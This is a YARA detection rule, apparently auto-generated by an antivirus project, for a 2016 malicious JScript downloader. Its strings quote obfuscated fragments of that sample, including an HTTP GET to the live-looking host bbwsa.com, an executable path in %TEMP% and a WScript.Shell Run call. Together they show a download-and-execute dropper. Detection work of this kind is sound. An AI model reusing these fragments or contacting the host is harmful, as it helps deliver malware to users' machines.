rule sig_20160328_7b998556c95c6f4dcf8b5be17ad79894 {
  meta:
    description = "datamaliciousorder - file 20160328_7b998556c95c6f4dcf8b5be17ad79894.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cad487501e8af9a61ae87ea3171b849e90129cabe0d2ea4993bfaa98ded6bbcb"

  strings:
    $s1  = "function Ygwhbb() {return Yfgdhum[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"dTGE7zNt.exe\";};" fullword ascii
    $s2  = "Aubjyyr[Xgbfjokup](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Iumdecxkq](Lyvyjyprw() * 11)} while (Aubjyyr[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Yfgdhum = function Goylbb() {return WScript[Zanwrwdm](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Xdlefnta(Ukvyh, Mlyrrxcdui){return Ukvyh - Mlyrrxcdui;};" fullword ascii
    $s6  = "return Xdlefnta(Lrdgftpcqk, Bmbbpigzxj);" fullword ascii
    $s7  = "function Zlhrvdegy(Vnrzfcgwvp){Yfgdhum[\"Run\"](Vnrzfcgwvp, Brqomhkako, Brqomhkako);};" fullword ascii
    $s8  = "function Owiuid() {return ((Qxprghlc == true) && (Qxprghlc == Botgjn)) ? 1 : Brqomhkako;};" fullword ascii
    $s9  = "Qxprghlc = true; " fullword ascii
    $s10 = " while (Lauogog){" fullword ascii
    $s11 = "var Botgjn = false;" fullword ascii
    $s12 = "var Rpuoyoyr = new this[\"Date\"]();" fullword ascii
    $s13 = "function Yowrlva(){return Zanwrwdm;};" fullword ascii
    $s14 = "function Kkirksizr()" fullword ascii
    $s15 = "function Lyvyjyprw(){return 22;};" fullword ascii
    $s16 = "Botgjn = true; " fullword ascii
    $s17 = "var Hnnwmvgj = false;" fullword ascii
    $s18 = "var Qxprghlc = false;" fullword ascii
    $s19 = "function Favicw(Payeipl) {var Abxtlyt = (1, 2, 3, 4, 5, Payeipl); return Abxtlyt;};" fullword ascii
    $s20 = "function Sodumwa(){return Fotqnykqtb;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}